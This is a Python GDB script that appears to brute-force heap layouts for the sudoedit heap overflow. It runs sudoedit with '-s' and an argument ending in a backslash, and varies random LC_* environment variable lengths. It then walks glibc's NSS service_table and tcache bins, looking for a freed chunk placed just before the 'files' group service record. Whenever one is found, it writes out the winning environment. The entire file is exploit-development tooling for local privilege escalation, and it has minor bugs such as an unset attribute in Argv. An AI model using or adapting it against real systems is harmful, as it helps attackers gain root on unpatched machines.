import gdb
import random
from datetime import datetime


import gdb
import random


class LCVar:
        def __init__(self, key, value="C.UTF-8@", range_min=0, range_max=247):
                self.key = key
                self.random_length = random.randint(range_min, range_max)
                self.value = value + "A" * self.random_length

        def __str__(self):
                return "".join([self.key, "=", self.value])


class Argv:
        def __init__(self, len_a=10, overflow=False):
                self.value = "A" * len_a
                if overflow:
                        self.value += "\\"

        def __len__(self):
                return self.len_a + 1

        def __str__(self):
                return self.value


class Chunk:
        def __init__(self, addr, info, tcached=False):
                self.addr = addr
                void_ptr = gdb.lookup_type("void").pointer()
                # for pointer arithmetic
                self.raw_addr = addr.cast(void_ptr)
                self.info = info
                self.tcached = tcached

        def __getitem__(self, idx):
                if idx == 0:
                        return self.addr
                elif idx == 1:
                        return self.info
                else:
                        raise IndexError("Index out of bounds")

        def __str__(self):
            return "".join([str(self.addr), ": ", str(self.info)])



def set_gdb_config():
        gdb.execute("set pagination off")
        gdb.execute("set breakpoint pending on")

def set_environment(lc_names):
        gdb.execute("unset environment")
        lc_names2 = random.sample(lc_names, random.randint(1, len(lc_names)))
        lc_vars = [LCVar(var_name) for var_name in lc_names2]
        for var in lc_vars:
                gdb.execute(f"set environment {var.key} = {var.value}")
        return lc_vars

def set_breakpoints():
        gdb.execute("delete breakpoints")
        gdb.execute("b sudoers.c:854")

def run_sudoedit(argv=Argv()):
        gdb.execute(f"run -n -s {argv}")

def parse_nss_databases():
        chunks = []
        char_pointer_type = gdb.lookup_type("char").pointer()
        service_table_addr = gdb.parse_and_eval("service_table")
        chunks.append(Chunk(service_table_addr, "service_table"))
        db = service_table_addr.dereference()["entry"]
        while db != 0x0:
                db_name = db.dereference()["name"].cast(char_pointer_type).string()
                chunks.append(Chunk(db, f"database {db_name}"))
                service = db.dereference()["service"]
                while service != 0x0:
                        service_name = service.dereference()["name"].cast(char_pointer_type).string()
                        chunks.append(Chunk(service, f"database: {db_name}, service: {service_name}"))
                        service = service.dereference()["next"]
                db = db.dereference()["next"]
        return sorted(chunks, key=lambda x: x[0])

def parse_tcache():
        chunks = []
        tcache = gdb.parse_and_eval("tcache")
        size = 0x20
        for i in range(0, 64):
                chunk = tcache.dereference()["entries"][i]
                if chunk != 0x0:
                        chunks.append(Chunk(chunk, hex(size), True))
                size += 0x10
        return chunks

def find_solution(heap, within_range=150):
        for i in range(len(heap) - 1):
                if heap[i].tcached:
                        if "group, service: files" in heap[i+1].info:
                            if (heap[i+1].raw_addr - heap[i].raw_addr) < within_range:
                                return True
        return False


if __name__ == "__main__":
        random.seed(datetime.now())
        lc_list = [
                "LC_TIME",
                "LC_CTYPE",
                "LC_MONETARY",
                "LC_NUMERIC",
                "LC_NAME",
                "LC_ADDRESS",
                "LC_PAPER",
                "LC_TELEPHONE",
                "LC_ALL",
                "LC_MESSAGES",
                "LC_IDENTIFICATION",
                "LC_MEASUREMENT",
                "LC_COLLATE",
                "LANG",
                "LANGUAGE",
        ]
        set_gdb_config()
        set_breakpoints()
        found = False
        max_iters = 1500
        iter = 0
        while not found and iter < max_iters:
                lc_vars = set_environment(lc_list)
                argv = Argv()
                run_sudoedit(argv)
                chunks = parse_nss_databases()
                tcache = parse_tcache()
                heap = chunks + tcache
                heap = sorted(heap, key=lambda x: x[0])
                for chunk in heap:
                        print(chunk)
                found = find_solution(heap, 0x1d0)
                if found:
                        print("Found solution")
                        with open("solution" + str(iter), "w") as f:
                                for var in lc_vars:
                                        f.write(str(var) + "\n")
                                f.write(str(argv) + "\n")
                                for chunk in heap:
                                        f.write(str(chunk) + "\n")
                iter += 1
